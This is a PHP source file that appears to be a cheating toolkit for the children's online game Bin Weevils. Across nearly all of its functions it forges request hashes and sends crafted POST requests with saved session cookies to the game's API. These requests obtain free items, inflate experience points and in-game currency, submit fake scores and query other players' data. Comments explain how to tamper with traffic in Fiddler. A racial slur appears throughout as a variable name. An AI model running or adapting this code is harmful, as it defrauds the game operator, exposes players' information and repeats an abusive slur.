		print '<h2>The free item was='.$Id.' !</h2>'; #doesnt really work due to api. dont give no input
		print $outputnigga;
		}
		
		
		function rateissue() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/magazines/read/rateIssue.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$idx = "'";
		$mark = 5;
		$uniqueID = 959979;
		$hash = o2_genhash($mark.$timer.$uniqueID.$idx);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash".$hash."&mark=".$mark."&idx=".$idx."&uniqueID=".$uniqueID."&timer=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #only logged in user.
		}
		
		
		function getstoreditems() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/nest/getStoredItems.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = 220673514;
		$hash = o2_genhash($idx);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works but only can view the leaderboards.
		}
		
		
		function getvouchers() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/loyalty/getVouchers.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$userIDX = 220673514;
		$hash = o2_genhash($userIDX);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&userIDX=".$userIDX);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works but only can view the leaderboards.
		}
		
		
		function banditxp() {
		$curl = curl_init("http://lb.binweevils.com/nest/rate-nest-room");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$rating = 5; #always 5 gives the most exp
		$locID = 308615433; #you can get the locID from instanceID nestconfig.
		$hash = o2_genhash($rating.$locID);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "rating=".$rating."&locID=".$locID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		
		function sendBuddyMessage() {##gives info
		$curl = curl_init("http://lb.binweevils.com/buddy-messages/send-buddy-message");
		curl_setopt($curl, CURLOPT_POST, true);
		$recipIDX = 963706;
		$msg = "Hey man, where you been? i havent seen you for a very long time if you do come pass by this message, let me know xD. Also add my faace b in. weevils stunnx f b";
		$hash = o2_genhash($msg.$recipIDX.$hash);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "msg=".$msg."&recipIDX=".$recipIDX."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
		}
		
		
        function shopitem2() {
        $curl = curl_init("http://lb.binweevils.com/php2/shop/departmentStore/buyItem.php");
        curl_setopt($curl, CURLOPT_POST, true);
        $storeName = "nestco";
        $colour = "0FFFFF"; //2000 is a blue color :p
        $userIDX =  file_get_contents("idx.txt"); // also itemTypeID 3475 is required only lvl 15
        $itemTypeID = (3475); // this is the fridge // 3475 isnt the fridge, its worth 50k and emits 1515xp
        $timer = rand(1000,50000) ; // timer so you 1000 = 1 item :P etc
        $hash = o2_genhash($storeName.$userIDX.$itemTypeID.$timer); 
        curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&userIDX=".$userIDX."&storeName=".$storeName."&colour=".$colour."&itemTypeID=".$itemTypeID."&timer=".$timer);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
        $outputnigga = trim(curl_exec($curl));
        curl_close($curl);
        print $outputnigga;
        print ("  hash is = ".$hash);
        }
        
        function itemhack2($id) {
		$curl = curl_init("http://lb.binweevils.com/shop/buyitem");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$shop = "furniture";
		$id = 39;
		$itemColour = "-1";
		$timer = rand(40000,50000); // works but says res=8 idk
		$hash = o2_genhash($st.$shop.$id.$itemColour.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&st=".$st."&shop=".$shop."&id=".$id."&timer=".$timer."&itemColour=".$itemColour);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
        }
        
        
        function frombuddy() {##gives info
		$curl = curl_init("http://lb.binweevils.com/buddy-messages/delete-no-from-buddy");
		curl_setopt($curl, CURLOPT_POST, true);
		$ids = 1;
		$hash = o2_genhash($ids.$hash);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "ids=".$ids."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
        }
        
        
        function buddies() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/leaderboards/buddies.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = file_get_contents("idx.txt");
		$hash = o2_genhash($idx);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&idx=".$idx);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
        }
        
        
        function specialmoves() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php/getSpecialMoves.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$userID = "Legentil"; ## change lastaccinfo
		$hash = o2_genhash($userID);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&userID=".$userID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
        }
        
        
        function mag2list() {##gives info
		$curl = curl_init("http://lb.binweevils.com/magazines/get-magazine-list?");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = "%2D1"; // two version one you can get ppls magazine by giving their idx // "%2D1" means everyone
		$hash = o2_genhash($idx);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&idx=".$idx);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; //works
        }
        	
        function getdefs() {
		$curl = curl_init("http://lb.binweevils.com/php2/social/getDefs.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$weevils = "Sickmade,rainygamer916,Just_Shani,vert-green,bandit";
		$hash = o2_genhash($timer.$weevils);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&weevils=".$weevils."&timer=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
        }
        
        function getdefs2() {
		$curl = curl_init("http://lb.binweevils.com/php2/social/getDefs.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = "152007";
		$weevils = "Sickmade,master2101,Just_Shani,bandit";
		$hash = o2_genhash($timer.$weevils);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&weevils=".$weevils."&timer=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
        }
        
        
        function collectxp() {##gives info
		$curl = curl_init("http://lb.binweevils.com/rewards/collect-xp");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$locationid = moneyexploitLOCID();
		$total = 80;
		$idx = file_get_contents("idx.txt"); // make sure you add the idx
		$hash = o2_genhash($locationid.$idx.$total.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&st=".$timer."&locID=".$locationid."&total=".$total."&idx=".$idx);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		#hash=c30e3880dfd95893b5dc3e3dc9649155&st=586031&locID=999999&total=1000&idx=220673514
		#$locid.$idx.$total.$st); ##works very well good level trick. 
		}
		
		function activation() {
		$curl = curl_init("http://play.binweevils.com/activation.php?rndVar=0.052903988398611546");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = file_get_contents("idx.txt");
		$hash = o2_genhash($idx);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&idx=".$idx);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}


		function email() {
		$curl = curl_init("http://play.binweevils.com/includes/verifyEmail.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$email = "stunnxx@gmail.com";
		$hash = o2_genhash($email);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&email=".$email);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		
	    function getstamp() {
		$curl = curl_init("http://lb.binweevils.com/php2/cameraPics/addPic.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$picHash = "4b640ecd38e103e5114559f43e864857";
		$size = "3";  // i fixed it, and made my own version. this one was given by adrian.
		$userIDX = "220921395";
		$hash = o2_genhash($userIDX.$picHash.$size);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=9c8f51b11e5917d524b769ae0629308d".$hash."&timer=".$timer."&userIDX=".$userIDX."&size=".$size."&picHash=4b640ecd38e103e5114559f43e864857".$picHash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	    }
	    
	    
	    function submitScore() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/leaderboards/games/submitScore.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$playerIdx = 216253239; #idx of the weevil u palying the game on
		$score = 402823; # score
		$gameId = 47; 
		$hash = o2_genhash($gameId.$playerIdx.$score.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "playerIdx=".$playerIdx."&timer=".$timer."&hash=".$hash."&score=".$score."&gameId=".$gameId);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	    }
	
		function submit2() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/game/submit-single?rndVar=0.037698044907301664");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$score = 4000; #score
		$gameID = 105; 
		$hash = o2_genhash($gameID.$score.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "st=".$st."&hash=".$hash."&score=".$score."&gameID=".$gameID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		function getcomp() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/competitions/get-comp-totals?rndVar=0.44478893047198653");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$compId = 2; #compid
		$hash = o2_genhash($st.$compId);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "st=".$st."&hash=".$hash."&compId=".$compId);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		
	    function founditems($compId) {##game stuff
		$curl = curl_init("http://lb.binweevils.com/competitions/get-found-items?rndVar=0.40213080029934645");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$compId = 2; #compid
		$hash = o2_genhash($st.$compId);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "st=".$st."&hash=".$hash."&compId=".$compId);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		
        function competed($compId) {##game stuff
		$curl = curl_init("http://lb.binweevils.com/competitions/has-competed?rndVar=0.4452654728665948");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$compId = 2; #compid
		$hash = o2_genhash($compId.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "st=".$st."&hash=".$hash."&compId=".$compId);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
	//	http://lb.binweevils.com/php2/photobooth/upload-framed-picture.php?rndVar=0.6125882100313902&color=0&itemTypeID=202&picHash=d214da69c497a964f9fa6107c1e65d2c&timer=448747&hash=9dd03437568422f6e6eecd31ddadd65b
		function hashgeneratorforapis() {## new park api - item testing
		$color = 0; // cant change colour sadly.
		$itemTypeID = 1679;
		$picHash = '82b07cfad7c5df7227455dcde3561024'; #leave the same //use this too 82b07cfad7c5df7227455dcde3561024 you get different ones each user d214da69c497a964f9fa6107c1e65d2c
		$timer = 448747; // you get the hash and then change it with hash= and change timer and id dont change picHash. Also erase the response body. and then execute with fiddler
		$hash = o2_genhash($color.$itemTypeID.$picHash.$timer);
		print ("hash is ".$hash);
		}
		
		
		function hashgeneratormessages() {## test
		$idx = 216260757; // 
		$messageId = 205;
		$timer = 11083; // you get the hash and then change it with response and change timer and idx http://prntscr.com/blh0n7 //http://prntscr.com/blh0u4
		$hash = o2_genhash($idx.$messageId.$timer);
		print ("hash is ".$hash);
		}
		
		
		function hashgeneratornest() {## Works :P
		$id = file_get_contents("idx.txt"); // works ;p
		$st = 12903;
		$hash = o2_genhash($id.$st); // works but sadly others cant see you in their nest you change with anothers invitation hash request.
		print ("hash is ".$hash);
		print ("  this is the timer = $st");
		}
		
		function neststate() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/nest/get-nest-state?rndVar=0.7291705859825015");
		curl_setopt($curl, CURLOPT_POST, true);
		$id = "samfay";
		$hash = o2_genhash($id);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "id=".$id."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		function getLastLogin() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/social/getDefs.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$weevils = "Chimy539,Apostle,lVloz_Back,iMoney,Assassinate,Illusionist,360-No-Scope,Astruhh,-iLL,Subside,Venomous Blood,Indicate,Rogue-xD,AK-14,brodie4,-rjay-,bandit";
		$timer = timer_getandinc(); // only ppl you added.
		$hash = o2_genhash($timer.$weevils);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "timer=".$timer."&weevils=".$weevils."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		
		function singleGameData() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/leaderboards/singlePlayerGame.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = 216253239;
		$gameId = 1; // only your acc
		$hash = o2_genhash($idx.$gameId);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&gameId=".$gameId."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		function hashadd() {## new park api - item testing
		$weevils = "Espionage,Interigation,Rogue-xD,Octagor,Endeavor,EnlightenedOne,ItsTricky,revenant,V3L0C1TY,-orangeweevil,-Anarchy-,Tomato paste"; // cant change colour sadly.
		$timer = 9900;
		$hash = o2_genhash($timer.$weevils);
		print ("hash is ".$hash); // works kinda idk look soon
		}
		
		function hashfood() {## made by adrian 
		$cost = 25;
		$type = "hotdog";
		$st = 988860;
		$energyValue = 30;
		$hash = o2_genhash($cost.$type.$st.$energyValue);
		print ("hash is ".$hash);
		}
		
		function leaderboard2() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/leaderboards/games/getLeaderboard.php?rndVar=0.5930975847877562");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$mode = "overall";
		$maxCount = 100;
		$gameId = 2;
		$hash = o2_genhash($timer.$mode.$maxCount.$gameId);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "timer".$timer."&hash=".$hash."&mode=".$mode."&maxCount=".$maxCount."&gameId=".$gameId);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		function hashstats() {## made by adrian 
		$st = 100;
		$fitness = 100;
		$st = 121967;
		$happiness = 100;
		$hash = o2_genhash($food.$fitness.$st.$happiness);
		print ("hash is ".$hash);
		}
		
		function hashitems() {## new park api - item testing
		$colour = -1; // cant change colour sadly.
		$idx = 220888083;
		$timer = 448747;
		$itemID = 600;
		$shopType = "popUpShop";
		$hash = o2_genhash($colour.$timer.$idx.$itemID.$shopType);
		print ("hash is ".$hash);
		}
		
		function doshitem2() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/shop/buyDoshShopItem.php?rndVar=0.7159512164071202");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$shopType = "popUpShop";
		$idx = 220888083;
		$itemID = 934;
		$colour = -1;
		$hash = o2_genhash($timer.$shopType.$idx.$itemID.$colour);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "timer".$timer."&hash=".$hash."&shopType=".$shopType."&idx=".$idx."&itemID=".$itemID."&colour=".$colour);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		function recoveritems() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/nest/recoverItemsFromLocation.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$locationID = 273733714;
		$hash = o2_genhash($locationID.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "timer".$timer."&hash=".$hash."&locationID=".$locationID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		function itemsrecover() {## only your nest i think.
		$timer = 268912; // works http://lb.binweevils.com/php2/nest/recoverItemsFromLocation.php?rndVar=0.6008453010581434
		$locationID = 278380366; // use this put in response Body timer=189878&hash=2e633c22fa203a08ff46b2983e898818&locationID=278360930 and then change it.
		$hash = o2_genhash($locationID.$timer);
		print ("hash is ".$hash);
		}
		
		function removeplant() {## works but, only you.
		$st = 12397; // cant change colour sadly.
		$plantID = 296901848;
		$hash = o2_genhash($plantID.$st);
		print ("hash is ".$hash);
		}
		
		function msgs() {## second version, maybe this is better.
		$msg = "..."; // works just need to change it with fiddler
		$recipIDX = 220878426;
		$hash = o2_genhash($msg.$recipIDX);
		print ("hash is ".$hash);
		}
		
		function submittrial() {## second version, maybe this is better.
		$trackID = 3; // works just need to change it with fiddler
		$st = 739999;
		$timer = 70807;
		$hash = o2_genhash($trackID.$timer.$st);
		print ("hash is ".$hash);
		}
		
		function brainsubmit() {## second version, maybe this is better.
		$levels = 10; // works just need to change it with fiddler
		$st = 1230111;
		$score = 3000;
		$hash = o2_genhash($levels.$score.$st);
		print ("hash is ".$hash);
		}
		
		function diffmulch() {## second version, maybe this is better.
		$total = 500; // works just need to change it with fiddler
		$idx = 220888083;
		$st = 2813319;
		$hash = o2_genhash($total.$idx.$st);
		print ("hash is ".$hash);
		}
		
		function submitgame() {## 
		$result = 1; // 
		$st = 1021930;
		$key = "2e6b2d70f4d0481f89eeeff52478e7a5";
		$hash = o2_genhash($result.$key.$st);
		print ("hash is ".$hash);
		}
		
		function makeacc() {## 
		$ref;
		$weevilDef = 1011014061001718;
		$timer = 112322;
		$username = "testnigga";
		$password = "legend12345";
		$hash = o2_genhash($timer.$username.$password.$ref);
		print ("hash is ".$hash);
		}
		
		function registeracc() {## 
		$curl = curl_init("http://lb.binweevils.com/php2/registration/registrationAds.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = 110862;
		$weeviLDef = 1011014061001717;
		$username = "paskabinox123";
		$password = "legend12345";
		$hash = o2_genhash($password.$timer.$username.$weevilDef);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&timer=".$timer."&password=".$password."&username=".$username."&weevilDef=".$weevilDef."&ref=".$ref);
		curl_setopt($curl, CURLOPT_COOKIEJAR, "sitecookies.txt");
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		print ("hash is ".$hash);
		}
		
		function submittrack() {##game stuff 2nd version :PPP 
		$curl = curl_init("http://lb.binweevils.com/game/submit-trial?rndVar=0.7569740400649607");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = 123187;
		$trackID = 3;
		$time = 62100; // 62100 = 69 mulch /65222 works you just change this info on fiddler on response Body.
		$hash = o2_genhash($trackID.$time.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "st".$st."&hash=".$hash."&trackID=".$trackID."&time=".$time);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print ("hash is ".$hash);
		}
		
		function turn2() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/game/submit-turn");
		curl_setopt($curl, CURLOPT_POST, true);
		$result = 0;
		$st = 288900;
		$key = "ce9db6fed1314088389ef9dcaea5fdf8";
		$hash = o2_genhash($result.$key.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "st".$st."&hash=".$hash."&result=".$result."&key=".$key);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print ("hash is ".$hash);
		}
		
		function def3() {## 
		$idx = 220802067; // 
		$timer = 237189;
		$def = 302121657109002004;
		$hash = o2_genhash($idx.$def.$timer);
		print ("hash is ".$hash);
		}
		
		function buyitem() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/shop/buyitem?rndVar=0.31513055274263024");
		curl_setopt($curl, CURLOPT_POST, true);
		$id = 2359;
		$st = rand(40000,50000);
		$itemColour = -1;
		$shop = "furniture";
		$hash = o2_genhash($itemColour.$st.$shop.$id);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash".$hash."&st=".$st."&id=".$id."&itemColour=".$itemColour."&shop=".$shop);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print ("hash is ".$hash);
		}
		
		function trackbuilder() {## 
		$trackID = 26; // it werent working because of hash order.
		$lap2 = 2;
		$lap1 = 3;
		$timer = 69323; // fixed
		$lap3 = 4;
		$hash = o2_genhash($lap1.$lap2.$lap3.$timer.$trackID); //[hash order was wrong, now fixed].
		print ("hash is ".$hash);
		}
		
		function hagglehutt() {##
		$gardenitems = 10398547;
		$timer = 989051;
		$items = "522459104,522459103,522459102,522459101,522459100,522459099,522459098,522459097,522459096,522459095,522459094,522459093,522459091,522459090,522459089,522459088,522459087,522459085,522458988,522458987,522458986,522458985,522458984";
		$hash = o2_genhash($gardenitems.$items.$timer);
		print ("hash is ".$hash);
		}
		
		function completeword() {##
		$completed = 1;
		$userID = "coldace";
		$progress = "11AB11";
		$gridID = 25;
		$hash = o2_genhash($completed.$userId.$progress.$gridID);
		print $outputnigga;
		}
		
		function saveitem() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php/saveWordSearchProgress.php?rndVar=0.5179709065705538");
		curl_setopt($curl, CURLOPT_POST, true);
		$completed = 1;
		$userID = "coldace";
     	$progress = mt_rand(-100,-200); //suprisingly works lol just change gridid and stuff
		$gridID = 28;
		curl_setopt($curl, CURLOPT_POSTFIELDS, "completed=".$completed."&userID=".$userID."&progress=".$progress."&gridID=".$gridID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		function achievementsget() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/achievements/getCompletedAchievements.php?rndVar=0.4820815189741552");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = 261069; 
		$idx = 74499; // works just put timer and idx and hash ;P
		$hash = o2_genhash($idx.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash".$hash."&idx=".$idx."&timer=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print ("hash is ".$hash);
		}
		
		function submitstart() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/nest/nestInspector/submitStart.php?rndVar=0.567240315489471");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = 1965226; 
		$idx = 216253239; // works only lastaccinfo. type this in any response timer=1965226&hash=cbb14ac3bfe94bf68cb396ff4b79c63e&idx=220878426
		$hash = o2_genhash($idx.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash".$hash."&idx=".$idx."&timer=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print ("hash is ".$hash);
		}
		
		function startsession() {##game stuff
		$curl = curl_init("http://play.binweevils.com/tycoon/startSession.php?rndVar=0.1291462671943009");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = 22035631; 
		$nid = 235117807; // 
		$tyc = "true";
		$id = "coldace"; // doesnt do anything lol
		$st = 11038;
		$hash = o2_genhash($idx.$nid.$tyc.$id.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash".$hash."&st=".$st."&idx=".$idx."&nid=".$nid."&tyc=".$tyc."&id=".$id);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print ("hash is ".$hash);
		}
		
		function shopbuy() {##game stuff
		$colour = "-100,-100,40"; 
		$idx = 220802067; // 
		$voucher = -1;
		$id = 12;
		$timer = 3462179;
		$hash = o2_genhash($id.$colour.$voucher.$idx.$timer);
		print ("hash is ".$hash);
		}
		
	    function weevildefchange2() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/weevil/changeWeevilDef.php?rndVar=0.5608644252642989");
		curl_setopt($curl, CURLOPT_POST, true);
		$def = 106315657106001101; // works only for tycoons sucks but ok.
		$idx = 220888083; // works just put timer and idx and hash ;P on fidd
		$timer = rand(10000,100000);
		$hash = o2_genhash($def.$idx.$timer);
